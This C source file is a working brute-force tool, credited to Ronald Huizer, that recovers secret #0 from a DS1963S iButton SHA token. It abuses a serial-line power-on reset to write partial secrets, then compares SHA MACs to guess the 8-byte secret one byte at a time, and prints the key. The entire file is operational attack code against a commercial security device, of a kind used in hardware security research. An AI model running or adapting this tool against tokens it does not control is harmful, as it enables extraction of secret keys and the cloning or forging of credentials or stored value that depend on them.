/*
 *  ibutton-brute.c
 *
 *  A complexity reduction attack to uncover secret #0 on the iButton DS1963S.
 *
 *  -- Ronald Huizer, 2012
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include "ibutton.h"
#include "ibutton/ownet.h"
#include "ibutton/shaib.h"

#define SERIAL_PORT "/dev/ttyUSB0"

extern int fd[MAX_PORTNUM];

struct brutus
{
	SHACopr		copr;
	uint8_t		target_hmac[32];
	uint8_t		secret[8];
	uint8_t		secret_idx;
};

int brutus_init(struct brutus *brute)
{
	SHACopr *copr = &brute->copr;
	uint8_t buf[32];

	/* Initialize the hmac we'll brute force. */
	brute->secret_idx = 0;
	memset(brute->secret, 0, sizeof brute->secret);

	/* Get port. */
        if ( (copr->portnum = owAcquireEx(SERIAL_PORT)) == -1)
		return -1;

	/* Find DS1963S iButton. */
	if (FindNewSHA(copr->portnum, copr->devAN, TRUE) == FALSE)
		return -1;

	/* Zero memory data page #0 and the scratchpad. */
	memset(buf, 0, sizeof buf);
	WriteDataPageSHA18(copr->portnum, 0, buf, 0);
	WriteScratchpadSHA18(copr->portnum, 0, buf, 32, 0);

	/* Calculate SHA1 MAC over zeroed data. */
        SHAFunction18(copr->portnum, 0xC3, 0, 0);
        ReadScratchpadSHA18(copr->portnum, 0, 0, brute->target_hmac, 0);
}

void brutus_destroy(struct brutus *brute)
{
	owRelease(brute->copr.portnum);
}

/* Pulling down the RTS and DTR lines on the serial port for a certain
 * amount of time power-on-resets the iButton.
 */
void ibutton_hide_set(SHACopr *copr)
{
	int status = 0;

	if (ioctl(fd[copr->portnum], TIOCMSET, &status) == -1) {
		perror("ioctl():");
		exit(EXIT_FAILURE);
	}

	sleep(1);

	/* Release and reacquire the port. */
	owRelease(copr->portnum);

        if ( (copr->portnum = owAcquireEx(SERIAL_PORT)) == -1) {
		fprintf(stderr, "Failed to acquire port.\n");
		exit(EXIT_FAILURE);
	}

	/* Find the DS1963S iButton again, as we've lost it after a
	 * return to probe condition.
	 */
	if (FindNewSHA(copr->portnum, copr->devAN, TRUE) == FALSE) {
		fprintf(stderr, "No DS1963S iButton found.\n");
		exit(EXIT_FAILURE);
	}
}

void ibutton_secret_write_partial(SHACopr *copr, int secret, uint8_t *data, size_t len)
{
	int secret_addr;
	char buf[32];
	int i;

        if (secret < 0 || secret > 7) {
                fprintf(stderr, "Invalid secret page.\n");
                exit(EXIT_FAILURE);
        }

        secret_addr = 0x200 + secret * 8;

	if (len > 8) {
		fprintf(stderr, "Secret length should <= 8 bytes.\n");
		exit(EXIT_FAILURE);
	}

	if (EraseScratchpadSHA18(copr->portnum, 0, 0) == FALSE) {
		fprintf(stderr, "Error erasing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ibutton_scratchpad_write(copr->portnum, 0, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	int address;
	uint8_t es;
	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ibutton_scratchpad_write(copr->portnum, secret_addr, data, len) == -1) {
		fprintf(stderr, "Error writing scratchpad.\n");
		exit(EXIT_FAILURE);
	}

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (1).\n");
		exit(EXIT_FAILURE);
	}

	ibutton_hide_set(copr);

	if (ReadScratchpadSHA18(copr->portnum, &address, &es, buf, 0) == FALSE) {
		fprintf(stderr, "Error reading scratchpad (2).\n");
		owPrintErrorMsg(stdout);
		exit(EXIT_FAILURE);
	}

	if (CopyScratchpadSHA18(copr->portnum, secret_addr, len, 0) == FALSE) {
		fprintf(stderr, "Error copying scratchpad.\n");
		exit(EXIT_FAILURE);
	}
}

int brutus_do_one(struct brutus *brute)
{
	SHACopr *copr = &brute->copr;
	uint8_t buf[32];
	int i;

	ibutton_secret_write_partial(
		&brute->copr,		/* SHA coprocessor context */
		0,			/* Secret number */
		brute->secret,		/* Partial secret to write */
		brute->secret_idx + 1	/* Length of the partial secret */
	);

	/* Zero memory data page #0 and the scratchpad. */
	memset(buf, 0, sizeof buf);
	WriteDataPageSHA18(copr->portnum, 0, buf, 0);
	WriteScratchpadSHA18(copr->portnum, 0, buf, 32, 0);

	/* Calculate SHA1 MAC over zeroed data. */
        SHAFunction18(copr->portnum, 0xC3, 0, 0);
        ReadScratchpadSHA18(copr->portnum, 0, 0, buf, 0);

	/* Compare the current hmac with the target one. */
	if (!memcmp(brute->target_hmac, buf, sizeof buf)) {
		/* We're done. */
		if (brute->secret_idx++ == sizeof(brute->secret) - 1)
			return 0;
	} else {
		/* Something went wrong. */
		if (brute->secret[brute->secret_idx]++ == 255)
			return -1;
	}

	/* More to come. */
	return 1;
}

int main(int argc, char **argv)
{
	struct brutus brute;
	uint8_t serial[8];
	int i, ret;

	if (brutus_init(&brute) == -1) {
		fprintf(stderr, "Init failed\n");
		exit(EXIT_FAILURE);
	}

	printf("Target HMAC: ");
	for (i = 0; i < sizeof brute.target_hmac; i++)
		printf("%.2x", brute.target_hmac[i]);
	printf("\n");

	do {
		printf("\rTrying: [");
		for (i = 0; i <= brute.secret_idx; i++)
			printf("%.2x", brute.secret[i]);
		for (i = brute.secret_idx + 1; i < sizeof brute.secret; i++)
			printf("  ");
		printf("]");
		fflush(stdout);

		ret = brutus_do_one(&brute);
	} while (ret == 1);

	printf("\n");

	if (ret == -1) {
		fprintf(stderr, "Something went wrong.\n");
		exit(EXIT_FAILURE);
	}

	printf("Key: ");
	for (i = 0; i < sizeof brute.secret; i++)
		printf("%.2x", brute.secret[i]);
	printf("\n");

	brutus_destroy(&brute);

	exit(EXIT_SUCCESS);
}
